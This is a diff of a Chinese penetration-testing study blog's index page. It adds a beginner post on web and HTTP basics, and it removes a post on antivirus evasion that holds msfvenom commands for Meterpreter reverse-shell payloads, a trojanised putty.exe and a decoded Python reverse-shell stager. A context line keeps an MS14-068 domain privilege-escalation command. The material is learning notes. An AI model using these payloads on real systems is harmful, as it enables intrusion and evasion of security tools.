@@ -64,6 +64,49 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WEB安全基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2021-09-07T14:07:39.000Z" itemprop="datePublished">2021-09-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">WEB安全基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>WEB:在互联网上面看到的所有网站，建立在http协议之上的<br>WEB软件  代码<br>软件：<br>操作系统软件：Windows，linux，unix，mac os<br>应用软件：淘宝、QQ、VX<br>架构：<br>C/S架构：客户端和服务器  安装、运行、更新  客户端<br>B/S架构：浏览器和服务器  开发、运行、更新  服务器</p>
+<p>网站相关的语言：<br>前端：HTML CSS JavaScript 前端三剑客<br>后端：PHP、Java、Python</p>
+<p>超文本：超级文本，用超链接的方式，将各种不同空间的文字信息组织在一起的网状文本。超文本的格式有很多，  HTML(超文本标记语言)</p>
+<p>URL：统一资源定位符，是资源标识符常见的一种，URL用来描述一台特定服务器上某个资源的特定位置<br><a target="_blank" rel="noopener" href="https://www.baidu.com/index.php?tn=monline_3_dg">https://www.baidu.com/index.php?tn=monline_3_dg</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/ucms_1.4.8/admin/login.php">http://127.0.0.1/ucms_1.4.8/admin/login.php</a><br><a target="_blank" rel="noopener" href="http://192.168.4.178:8060/">http://192.168.4.178:8060/</a><br>协议：https  http  ftp<br>主机、服务器：<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  192.168.4.155<br>本地资源：index.php<br>端口：8060</p>
+<p>http协议：Hyper Text Transfer Protocol（超文本传输协议）<br>在浏览器上访问网站，都得遵循这个协议<br>基于B/S架构<br>http报文分为三个部分：<br>①起始行<br>在请求报文中，用来说明需要做些什么<br>在响应报文中，用来说明结果是什么<br>②首部字段<br>起始行后面有0个或多个首部字段 首部字段最终以一个空行结束<br>③主体</p>
+<p>Cookie: 是某些网站，为了辨别用户的身份，进行会话跟踪，用来储存在用户本地终端上的数据，由客户端暂时或者永久保存，通常是经过加密的</p>
+<p>渗透测试：以“黑客”的身份，去对网站、服务器做渗透“攻击”，找到其中的漏洞，并进行反馈<br>黑盒测试：在不知道源代码、服务器环境的情况下，去进行渗透<br>白盒测试：在知道源代码、服务器环境的情况下，去进行渗透<br>代码审计</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckw8yh2660009jovj19f8c2xq" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-横向移动" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
@@ -99,7 +142,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#x69;&#x6c;&#117;&#64;&#x69;&#108;&#x75;&#x2e;&#99;&#111;&#x6d;">&#x69;&#x6c;&#117;&#64;&#x69;&#108;&#x75;&#x2e;&#99;&#111;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#x69;&#108;&#x75;&#x40;&#105;&#108;&#117;&#46;&#99;&#x6f;&#109;">&#x69;&#108;&#x75;&#x40;&#105;&#108;&#117;&#46;&#99;&#x6f;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -167,7 +210,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckw24ym2x0014i4vj4cjx0dav" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckw8yh26u0015jovjhzv69v01" class="article-share-link">Share</a>
       
       
     </footer>
@@ -242,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckw24ym300019i4vj19jhhmyq" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckw8yh26x001ajovja2brdjfv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -317,7 +360,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckw24ym2u0010i4vj2274980y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckw8yh26n000xjovj6ezlffq3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -402,7 +445,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckw24ym2w0012i4vjdhd61h1d" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckw8yh26v0017jovj2vvxe1vm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -457,7 +500,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckw24ym2d000ci4vj88dt9d1t" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckw8yh269000cjovj5evgd026" class="article-share-link">Share</a>
       
       
     </footer>
@@ -521,7 +564,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckw24ym2f000ei4vjechv4f7p" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckw8yh26a000ejovj52chf22s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -591,7 +634,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckw24ym2e000di4vjc6mk0wkt" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckw8yh269000djovj3xm456ei" class="article-share-link">Share</a>
       
       
     </footer>
@@ -648,7 +691,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckw24ym2q000wi4vjdzuxd3vo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckw8yh26l000vjovj7nazbby0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -714,89 +757,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckw24ym2q000vi4vj2k6nfqiu" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-免杀1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/09/%E5%85%8D%E6%9D%801/" class="article-date">
-  <time datetime="2021-08-09T13:00:36.000Z" itemprop="datePublished">2021-08-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/%E5%85%8D%E6%9D%801/">免杀1</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="免杀介绍"><a href="#免杀介绍" class="headerlink" title="免杀介绍"></a>免杀介绍</h2><p>杀软相关:</p>
-<ol>
-<li>扫描技术:</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">扫描技术：</span><br><span class="line">n 1、扫描压缩包技术：即是对压缩包案和封装⽂件作分析检查的技术。</span><br><span class="line">n 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序⽽⼤肆破坏电脑。</span><br><span class="line">n 3、修复技术：即是对恶意程序所损坏的⽂件进⾏还原</span><br><span class="line">n 4、急救盘杀毒：利⽤空⽩U盘制作急救启动盘，来检测电脑病毒。</span><br><span class="line">n 5、智能扫描：扫描最常⽤的磁盘，系统关键位置，耗时较短。</span><br><span class="line">n 6、全盘扫描：扫描电脑全部磁盘，耗时较⻓。</span><br><span class="line">n 7、勒索软件防护：保护电脑中的⽂件不被⿊客恶意加密。</span><br><span class="line">n 8、开机扫描：当电脑开机时⾃动进⾏扫描，可以扫描压缩⽂档和可能不需要的程序</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>监控技术</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">监控技术：</span><br><span class="line">n 1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控</span><br><span class="line">n 读取到内存中的⽂件；监控读取到内存的⽹络数据。</span><br><span class="line">n 2、⽂件监控：当发现写到磁盘上的⽂件中存在病毒，或者是被病毒感染，就会主动</span><br><span class="line">n 报警。</span><br><span class="line">n 3、邮件监控：当发现电⼦邮件的附件存在病毒时进⾏拦截。</span><br><span class="line">n 4、⽹⻚防护：阻⽌⽹络攻击和不安全下载。</span><br><span class="line">n 5、⾏为防护：提醒⽤户可疑的应⽤程序⾏为。</span><br></pre></td></tr></table></figure>
-
-<p>特征码</p>
-<p>文件特征码</p>
-<p>内存特征码</p>
-<p>文件校验和</p>
-<p>checksum   生成校验和：md5sum 文件名</p>
-<p>沙箱</p>
-<p>….</p>
-<h2 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h2><p>修改特征码: 逆向</p>
-<p>花指令免杀: 汇编</p>
-<p>加壳免杀</p>
-<p>内存免杀</p>
-<p>二次编译</p>
-<p>分离免杀: shellcode (机器码)</p>
-<p>资源修改:</p>
-<p>​    白名单: 把恶意程序修改成常见的程序的名称</p>
-<p>​    数字签名: 数字签名添加器</p>
-<p>​    资源替换: </p>
-<p>​        版本信息, 发行者信息, 图标信息等…<code>Resource Hacker</code></p>
-<h4 id="metasploit免杀"><a href="#metasploit免杀" class="headerlink" title="metasploit免杀"></a>metasploit免杀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-shellest 最小化生成payload</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#39;\x0f&#39;、&#39;\x00&#39;; </span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br></pre></td></tr></table></figure>
-
-<p>高级模块:</p>
-<p>​    show advanced    –&gt; 查看高级模块</p>
-<p>​    PrependMigrate               true    –&gt; 是否开启进程迁移   </p>
-<p>​    PrependMigrateProc                        –&gt; 指定迁移的进程 </p>
-<p>​    ExitOnSession            false                –&gt; 防止会话假死   </p>
-<p>​    EnableStageEncoding          true    –&gt; 允许编码</p>
-<p>​    StageEncoder                                    –&gt; 木马连接时,对stage进行编码</p>
-<p>​    EnableUnicodeEncoding            –&gt; 指定unicode编码</p>
-<p>​    </p>
-<p>​    raw: 原生代码,</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">生成py文件的木马</span><br><span class="line">msfvenom -a python  -p python/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f raw &gt; <span class="number">1.</span>py</span><br><span class="line"></span><br><span class="line">base64解密:</span><br><span class="line">密文:</span><br><span class="line">aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS4xMzUnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=</span><br><span class="line">解密:</span><br><span class="line">echo 密文 | base64 -d</span><br><span class="line"><span class="keyword">import</span> socket,zlib,base64,struct,time</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=socket.socket(<span class="number">2</span>,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;192.168.1.135&#x27;</span>,<span class="number">4444</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(d)&lt;l:</span><br><span class="line">    d+=s.recv(l-<span class="built_in">len</span>(d))</span><br><span class="line"><span class="built_in">exec</span>(zlib.decompress(base64.b64decode(d)),&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>编码模块: -e(指定编码)  -i(指定编码次数)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用:</span><br><span class="line">x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;xor_dynamic</span><br><span class="line">x64&#x2F;xor_dynamic</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">自编码免杀:</span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;IP LPORT&#x3D;PORT -e x86&#x2F;shikata_ga_nai -i 15 -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">自捆绑免杀:</span><br><span class="line">msfvenom -x putty.exe -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;4444 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckw24ym2p000ui4vj9aayeliz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckw8yh26m000wjovj7lvifanf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -842,6 +803,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
           </li>
         
@@ -855,10 +820,6 @@
         
           <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
           </li>
         
       </ul>
